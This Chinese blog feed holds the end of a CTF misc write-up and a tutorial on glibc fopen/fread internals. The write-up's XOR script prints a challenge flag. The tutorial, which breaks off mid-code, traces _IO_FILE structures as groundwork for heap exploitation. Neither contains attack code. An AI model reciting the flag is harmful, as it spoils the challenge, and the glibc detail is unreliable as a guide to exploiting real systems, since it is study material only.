src="https://s2.loli.net/2022/01/26/zEaNstOykM3bngZ.png"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="badPDF"><a href="#badPDF" class="headerlink" title="badPDF"></a>badPDF</h3><p>这也是个原题<a href="https://zyazhb.github.io/2020/08/16/ctf-hws/#fakepdf%EF%BC%8C%E6%9C%80%E5%90%8E%E7%94%A8python%E5%86%99%E4%B8%AA%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5">https://zyazhb.github.io/2020/08/16/ctf-hws/#fakepdf，最后用python写个解密脚本就可以</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">text = <span class="hljs-string">&#x27;676d60667a64333665326564333665326564333665326536653265643336656564333665327c&#x27;</span><br><br>j = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(text)//<span class="hljs-number">2</span>):<br>flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(text[j:j+<span class="hljs-number">2</span>], <span class="hljs-number">16</span>) ^ <span class="hljs-number">1</span>)<br>j += <span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># flag&#123;e27d3de27d3de27d3d7d3de27dde27d3&#125;</span><br></code></pre></td></tr></table></figure><h3 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h3><p>提取个压缩包</p><p><img src="https://s2.loli.net/2022/01/26/TnwWIsVzBGy4YhQ.png"></p><p>提取剪切板</p><p><img src="https://s2.loli.net/2022/01/26/qTcWK7UfXmQOldD.png"></p><p>最后提取出一个二维码，寄了，aztec啥的没听过。</p><p><img src="https://s2.loli.net/2022/01/26/gqlMJPZa4Lwhne6.png"></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hws</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>io_file小叙</title>
    <link href="/2021/12/26/io-file%E5%B0%8F%E5%8F%99/"/>
    <url>/2021/12/26/io-file%E5%B0%8F%E5%8F%99/</url>
    
    <content type="html"><![CDATA[<p>要学习基于IO_FILE的堆利用就得了解它的本质，以下会介绍几个主要的IO函数，结合源码和动态调试去学习。</p><h2 id="IO-FILE之fopen"><a href="#IO-FILE之fopen" class="headerlink" title="IO_FILE之fopen"></a>IO_FILE之fopen</h2><p>首先是编写一个简单的调用fopen函数的C程序。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>    FILE*fp = fopen(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">char</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>   在正式调试之前，先看一下fopen的总体流程图，有个总体的概念。有了主线之后，跟进代码后才不会在里面走丢了。如下图所示，先不解释太多，先跟着动手调试分析完fopen函数的执行流程，再反过头看看这个流程图就会很清晰了。</p><p> <img src="https://s2.loli.net/2021/12/26/vlJb7gp8SU6koys.png"></p><p>​    那么接下来就直接编译上面的源码，然后使用gdb调试程序，gdb跟进fopen函数，可以看到fopen实际上是_IO_new_fopen，它调用的是__fopen_internal。</p><p> <img src="https://s2.loli.net/2021/12/26/G5YaiCSVheT4jIN.png"></p><p>​    跟进__fopen_internal中。关键代码如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_FILE *<br>__fopen_internal (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> is32)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">locked_FILE</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> <span class="hljs-title">fp</span>;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>    _IO_lock_t lock;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> <span class="hljs-title">wd</span>;</span><br>   &#125; *new_f = (struct locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-keyword">sizeof</span> (struct locked_FILE));  <span class="hljs-comment">// 1、 分配内存</span><br> <br> ...<br> <br>   _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps); <span class="hljs-comment">// 2、 初始化结构体</span><br> ...<br> <br>   _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<span class="hljs-comment">// 设置vtable为_IO_file_jumps</span><br>   _IO_file_init (&amp;new_f-&gt;fp);<span class="hljs-comment">// 3、 将file结构体链接至_IO_list_all</span><br> <br> ...<br>   <span class="hljs-comment">// 4、 打开文件</span><br>   <span class="hljs-keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="hljs-literal">NULL</span>)<br>     <span class="hljs-keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);<br> <br> &#125;<br></code></pre></td></tr></table></figure><p>​     整个__fopen_internal函数包含四个部分：</p><ol><li><p>malloc分配内存空间</p></li><li><p>_IO_no_init对File结构体进行初始化</p></li><li><p>_IO_file_init将结构体链接至_IO_list_all链表中</p></li><li><p>_IO_file_fopen执行系统调用打开文件</p></li></ol><p>​    可以看到malloc函数分配了一个struct locked_FILE大小的结构体，并将返回的地址赋给了new_f变量。这个结构体在函数刚开始的地方被定义，在64位系统中大小为0x230，共包含了以下三个结构：_IO_FILE_plus、_IO_lock_t、IO_wide_data，其中_IO_FILE_plus为使用的IO_FILE结构体。</p><p>​    在gdb中可用p命令查看相关信息。</p><p> <img src="https://s2.loli.net/2021/12/26/iHThuXGjgnQ6pSC.png"></p><p>   调用完malloc之后，接着调用了_IO_no_init函数去初始化结构体，跟进去该函数。函数在/libio/genops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_IO_old_init (_IO_FILE *fp, <span class="hljs-keyword">int</span> flags)<br>&#123;<br>  fp-&gt;_flags = _IO_MAGIC|flags;<br>  fp-&gt;_flags2 = <span class="hljs-number">0</span>;<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_ptr = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_ptr = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_chain = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">/* Not necessary. */</span><br><br>  fp-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_backup_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_save_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_markers = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_cur_column = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _IO_JUMPS_OFFSET</span><br>  fp-&gt;_vtable_offset = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_lock != <span class="hljs-literal">NULL</span>)<br>    _IO_lock_init (*fp-&gt;_lock);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;<br><br><span class="hljs-keyword">void</span><br>_IO_no_init (_IO_FILE *fp, <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">int</span> orientation,<br>      struct _IO_wide_data *wd, <span class="hljs-keyword">const</span> struct _IO_jump_t *jmp)<br>&#123;<br>  _IO_old_init (fp, flags);<br>  fp-&gt;_mode = orientation;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-keyword">if</span> (orientation &gt;= <span class="hljs-number">0</span>)<br>    &#123;# 初始化fp的_wide_data字段<br>      fp-&gt;_wide_data = wd;<br>      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="hljs-literal">NULL</span>;<br><br>      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">/* Cause predictable crash when a wide function is called on a byte</span><br><span class="hljs-comment">       stream.  */</span><br>    fp-&gt;_wide_data = (struct _IO_wide_data *) <span class="hljs-number">-1L</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  fp-&gt;_freeres_list = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    可以看到函数最主要的功能是初始化locked_FILE里面的_IO_FILE_plus结构体，基本上将所有的值都初始化为NULL以及默认值，同时将_wide_data字段赋值并初始化。初始化结束后，FILE结构体如下。</p><p> <img src="https://s2.loli.net/2021/12/26/xd4BKef8IpMs1Dj.png"></p><p>   执行完_IO_no_init后，函数使用lea指令将_IO_FILE_plus结构体的vtable设置成了_IO_file_jumps(0x7ffff7dd06e0)。</p><p> <img src="https://s2.loli.net/2022/01/10/M6BmtYnxwIq8Gku.png"></p><p>   然后调用_IO_file_init将_IO_FILE_plus结构体链接到了_IO_list_all链表中，跟进该函数。</p><p> <img src="https://s2.loli.net/2021/12/26/eJB7u6c5QmFbTdt.png"></p><p>  该函数在/libio/fileops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_IO_new_file_init (struct _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-comment">/* POSIX.1 allows another file handle to be used to change the position</span><br><span class="hljs-comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span><br><span class="hljs-comment">     position before we do the first fseek (and until a following fflush). */</span><br>  fp-&gt;file._offset = _IO_pos_BAD;<br>  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;<br><br> # 调用_IO_link_in和设置_fileno<br>  _IO_link_in (fp);<br>  fp-&gt;file._fileno = <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>   可以看到这个函数的主体是调用了_IO_link_in函数，跟进去，函数在/libio/genops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_IO_link_in (struct _IO_FILE_plus *fp)<br>&#123;<br># 检查flag的标志位是否是<span class="hljs-function">_IO_LINKED</span><br><span class="hljs-function">  <span class="hljs-title">if</span> <span class="hljs-params">((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)</span></span><br><span class="hljs-function">    </span>&#123;<br># 设置_IO_LINKED标志位<br>      fp-&gt;file._flags |= _IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (_IO_FILE *) fp;<br>      _IO_flockfile ((_IO_FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;<br>      _IO_list_all = fp;<br>      ++_IO_list_all_stamp;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((_IO_FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    FILE结构体是通过_IO_list_all的单链表进行管理的，这里_IO_link_in函数的功能是检查FILE结构体是否包含_IO_LINKED标志，如果不包含则表示这个结构体没有链接进入_IO_list_all，则在后面将其链接进_IO_list_all链表，同时设置FILE结构体的_chain字段为之前的链表的值，否则直接返回。</p><p>​    所有_IO_file_init主要功能是将FILE结构体链接进入_IO_list_all链表。在没执行_IO_file_init函数前，_IO_list_all指向的是stderr结构体。</p><p> <img src="https://s2.loli.net/2021/12/26/VLMFwfkmbjupBi1.png"></p><p>​    执行完后可以看到_IO_list_all指向的是申请出来的结构体。</p><p><img src="https://s2.loli.net/2021/12/26/brR1IZwKBVOnk7W.png"></p><p>​    此时FILE结构体的_chain字段指向了之前的stderr结构体。</p><p> <img src="https://s2.loli.net/2021/12/26/PzopRdsfaBeZnLi.png"></p><p>将FILE结构体链接到_IO_list_all链表后，程序返回到__fopen_internal中，最后是调用_IO_file_open函数打开文件句柄，跟进该函数。函数在/libio/fileops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_FILE *<br>_IO_new_file_fopen (_IO_FILE *fp, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode,<br>            <span class="hljs-keyword">int</span> is32not64)<br>&#123;<br>  <br>  ...<br>  # 检查文件是否以打开，打开则返回<br>  <span class="hljs-keyword">if</span> (_IO_file_is_open (fp))<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  ## 设置文件打开模式<br>  <span class="hljs-keyword">switch</span> (*mode)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;r&#x27;</span>:<br>      omode = O_RDONLY;<br>      read_write = _IO_NO_WRITES;<br>      <span class="hljs-keyword">break</span>;<br>      ...    <br>     &#125;<br>  ...<br>  # 调用_IO_file_open函数<br>  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,<br>              is32not64);<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>  函数会先检查文件描述符是否打开，然后设置文件打开的模式，最后调用_IO_file_open函数。跟进_IO_file_open函数，该函数在/libio/fileops.c中。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_FILE *<br>_IO_file_open (_IO_FILE *fp, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">int</span> posix_mode, <span class="hljs-keyword">int</span> prot,<br>           <span class="hljs-keyword">int</span> read_write, <span class="hljs-keyword">int</span> is32not64)<br>&#123;<br>  <span class="hljs-keyword">int</span> fdesc;<br><br>  ...<br>  # 调用系统函数open打开文件  <br>  fdesc = open (filename, posix_mode | (is32not64 ? <span class="hljs-number">0</span> : O_LARGEFILE), prot);<br>  ...<br>  # 将文件描述符设置到FILE结构体的相应字段_fileno里<br>  fp-&gt;_fileno = fdesc;<br>  ...<br>  #再次调用_IO_link_in<br>  _IO_link_in ((struct _IO_FILE_plus *) fp);<br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    函数的主要功能就是执行系统调用open打开文件，并将文件描述符赋值给FILE结构体的_fileno字段，最后再次调用_IO_link_in函数，确保该结构体被链接到_IO_list_all链表。</p><p>​    执行完_IO_new_file_fopen函数后，FILE结构体如下图所示。</p><p> <img src="https://s2.loli.net/2021/12/26/Gzc9Y3CRpOn8LeM.png"></p><p>​    该函数执行完后，程序返回FILE结构体指针，分析结束。</p><p>   整个流程还是比较清晰的，fopen返回之后，_IO_list_all链表指向返回的FILE结构体，且FILE结构体的_chain字段指向之前的结构体（没有其他额外打开文件的话，将指向stderr结构体），同时其他的字段大多是默认的NULL值，vtable存储的是_IO_file_jumps。</p><h2 id="IO-FILE之fread"><a href="#IO-FILE之fread" class="headerlink" title="IO_FILE之fread"></a>IO_FILE之fread</h2><p>   前面分析了系统如何为FILE结构体分配内存并将其链接进_IO_list_all，那么这里则是讲述创建文件FILE之后，fread如何实现从文件中读取数据的。fread的大致流程如下。</p><p> <img src="https://s2.loli.net/2021/12/26/h6Sp3wALOnV1zbj.png"></p><p>   整体流程为fread调用vtable中的IO_file_xsgetn，其中IO_file_xsgetn是fread的核心函数，它的流程大致如下：</p><ol><li><p>判断fp-&gt;_IO_buf_base输入缓冲区是否为空，如果为空则调用_IO_doalllocbuf去初始化输入缓冲区。</p></li><li><p>在分配完输入缓冲区或输入缓冲区不为空的情况下，判断输入缓冲区是否存在数据。</p></li><li><p>如果输入缓冲区有数据则直接拷贝至用户缓冲区，如果没有或不够则调用_underflow函数执行系统调用读取数据到输入缓冲区，再拷贝到用户缓冲区。</p></li></ol><p>fread的函数原型是：</p><p>   size_t fread ( void * ptr, size_t size, size_t count, FILE * stream );</p><p>   其中，ptr：指向保存结果的指针；size：每个数据类型的大小；count：数据的个数；stream：文件指针函数返回读取数据的个数。</p><p>   示例程序如下。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>    FILE* fp = fopen(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-keyword">char</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    fread(ptr, <span class="hljs-number">1</span>, <span class="hljs-number">20</span>, fp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>   编译完成后用gdb进行调试。</p><p>   断点下载fread，在开始之前先查看下FILE结构体fp的内容。从下面的图里可以看到此时_IO_read_ptr和_IO_buf_base等指针都是空的，后面的分析一个很重要的步骤就是看这些指针是如何被赋值以及发挥作用的。</p><p> <img src="https://s2.loli.net/2021/12/26/b1HWpsuLZgd6F2S.png"></p><p>   vtable中的指针内容如下。</p><p> <img src="https://s2.loli.net/2021/12/26/iBzYucTKq1gLvQm.png"></p><p>   fread实际上是_IO_fread函数，文件目录为/libio/iofread.c。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_fread (<span class="hljs-keyword">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)<br>&#123;<br>  _IO_size_t bytes_requested = size * count;<br>  _IO_size_t bytes_read;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (bytes_requested == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br><br># 调用_IO_sgetn函数<br>  bytes_read = _IO_sgetn (fp, (<span class="hljs-keyword">char</span> *) buf, bytes_requested);<br>  _IO_release_lock (fp);<br>  <span class="hljs-keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;<br>&#125;<br>libc_hidden_def (_IO_fread)<br>&#125;<br></code></pre></td></tr></table></figure><p>_IO_fread函数调用了_IO_sgetn函数，跟进该函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_sgetn (_IO_FILE *fp, <span class="hljs-keyword">void</span> *data, _IO_size_t n)<br>&#123;<br>  <span class="hljs-comment">/* FIXME handle putback buffer here! */</span><br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br>libc_hidden_def (_IO_sgetn)<br></code></pre></td></tr></table></figure><p>又看到其调用了_IO_XSGETN函数，查看其定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span><br></code></pre></td></tr></table></figure><p>​    实际上就是FILE结构体中vtable的__xsgetn函数，跟进去/libio/fileops.c。</p><p>​    _IO_file_xsgetn是处理fread读入数据的核心函数，分为以下几个部分：</p><ol><li><p>fp-&gt;_IO_buf_base为空时，表明此时的FILE结构体中的指针未被初始化，输入缓冲区未建立，则调用_IO_doallocbuf去初始化指针，建立输入缓冲区。</p></li><li><p>输入缓冲区有输入，即fp-&gt;_IO_read_ptr小于fp-&gt;_IO_read_end，此时将缓冲区里的数据直接拷贝到目标buff。</p></li><li><p>输入缓冲区里的数据为空或者是不能满足全部的需求，则调用__underflow调用系统调用读入数据。</p></li></ol> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_file_xsgetn (_IO_FILE *fp, <span class="hljs-keyword">void</span> *data, _IO_size_t n)<br>&#123;<br>  _IO_size_t want, have;<br>  _IO_ssize_t count;<br>  <span class="hljs-keyword">char</span> *s = data;<br><br>  want = n;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      ...<br>      # <span class="hljs-number">1</span>、如果fp-&gt;_IO_buf_base为空的话则调用_IO_doallocbuf<br>      _IO_doallocbuf (fp);<br>    &#125;<br><br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br><br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (want &lt;= have)   # <span class="hljs-number">2</span>、输入缓冲区里已经有足够的字符，则直接把缓冲区里的字符给目标buff<br>    &#123;<br>      <span 